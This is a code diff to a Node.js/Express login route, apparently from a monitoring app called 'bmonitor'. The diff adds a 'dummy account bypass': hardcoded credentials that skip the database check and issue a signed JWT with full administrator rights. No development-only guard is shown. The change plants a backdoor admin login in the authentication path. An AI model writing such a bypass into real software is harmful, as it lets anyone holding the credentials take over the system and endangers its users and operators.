@@ -10,6 +10,22 @@ router.post('/login', async (req, res) => {
     if (!email || !password) {
       return res.status(400).json({ error: 'Email and password are required.' });
     }
+    
+    // --- DUMMY ACCOUNT BYPASS ---
+    if (email === 'dummy@bmonitor.local' && password === 'dummy123') {
+      const token = jwt.sign(
+        { id: 999, email: 'dummy@bmonitor.local', role: 'administrator' },
+        JWT_SECRET,
+        { expiresIn: process.env.JWT_EXPIRES_IN || '24h' }
+      );
+      return res.json({
+        message: 'Login successful (Dummy Account)',
+        token,
+        user: { id: 999, name: 'Dummy Admin', email: 'dummy@bmonitor.local', role: 'administrator' },
+      });
+    }
+    // ----------------------------
+
     const pool = getPool();
     const [rows] = await pool.execute(
       'SELECT id, name, email, password_hash, role FROM users WHERE email = ?',
